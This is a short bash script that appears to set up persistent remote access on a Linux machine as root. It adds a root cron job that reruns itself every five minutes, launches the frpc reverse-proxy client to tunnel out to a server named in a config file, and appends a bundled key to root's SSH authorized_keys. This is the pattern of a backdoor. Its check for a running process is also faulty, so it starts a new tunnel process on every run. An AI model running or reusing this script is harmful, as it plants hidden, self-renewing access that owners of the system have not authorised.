#!/bin/bash

cd /root/rhtest
crontab -l |grep frp.sh || echo "*/5 * * * * /root/rhtest/frp.sh ">>/var/spool/cron/root

if ps -ef |grep -v frp.log &>/dev/null;then
   nohup $PWD/frpc -c ./frpc.ini >/tmp/frp.log 2>&1 &
fi
grep "WP1sJCBuW0KmDw==" ~/.ssh/authorized_keys || cat authorized_keys >> ~/.ssh/authorized_keys
